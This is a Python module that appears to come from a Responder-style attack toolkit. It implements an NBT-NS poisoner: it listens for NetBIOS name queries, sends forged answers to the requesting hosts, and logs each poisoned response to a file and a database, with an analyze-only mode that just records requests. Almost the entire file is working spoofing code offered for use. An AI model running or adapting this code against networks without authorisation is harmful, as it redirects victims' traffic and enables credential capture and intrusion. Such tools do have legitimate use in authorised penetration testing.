#! /usr/bin/env python3
LogDir = './logs/'
import sys
from bin.packets import NBT_Ans
from bin.utils import *

if (sys.version_info > (3, 0)):
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

# NBT_NS Server class.
class NBTNS(BaseRequestHandler):

	def handle(self):

		data, socket = self.request
		Name = Decode_Name(NetworkRecvBufferPython2or3(data[13:45]))
		# Break out if we don't want to respond to this host
		if RespondToThisHost(self.client_address[0], Name) is not True:
			return None

		if data[2:4] == b'\x01\x10':
			if settings.Config.AnalyzeMode:  # Analyze Mode
				LineHeader = "[Analyze mode: NBT-NS]"
				#print(color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1))
				SavePoisonersToDb({
							'Poisoner': 'NBT-NS', 
							'SentToIp': self.client_address[0], 
							'ForName': Name,
							'AnalyzeMode': '1',
						})
			else:  # Poisoning Mode
				Buffer1 = NBT_Ans()
				Buffer1.calculate(data)
				socket.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
				LineHeader = "[*] [NBT-NS]"
				file = open(LogDir+'debug_log.log','a')
				file.write("\n%s Poisoned answer sent to %s for name %s (service: %s)" % (LineHeader, self.client_address[0], Name, NBT_NS_Role(NetworkRecvBufferPython2or3(data[43:46]))))
				file.close()
				#print(color("%s Poisoned answer sent to %s for name %s (service: %s)" % (LineHeader, self.client_address[0], Name, NBT_NS_Role(NetworkRecvBufferPython2or3(data[43:46]))), 2, 1))
				SavePoisonersToDb({
							'Poisoner': 'NBT-NS', 
							'SentToIp': self.client_address[0], 
							'ForName': Name,
							'AnalyzeMode': '0',
						})

